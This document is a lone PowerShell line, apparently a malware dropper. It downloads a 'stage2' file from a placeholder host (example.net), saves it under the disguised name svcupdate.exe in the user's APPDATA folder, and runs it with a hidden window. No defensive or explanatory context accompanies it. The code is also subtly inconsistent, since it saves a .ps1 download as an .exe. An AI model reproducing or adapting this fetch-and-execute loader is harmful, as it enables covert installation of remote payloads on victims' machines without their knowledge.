
$Stage2Url = 'http://example.net/stage2.ps1'; $Stage2Path = "$env:APPDATA\svcupdate.exe"; (New-Object System.Net.WebClient).DownloadFile($Stage2Url, $Stage2Path); Start-Process -FilePath $Stage2Path -WindowStyle Hidden; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
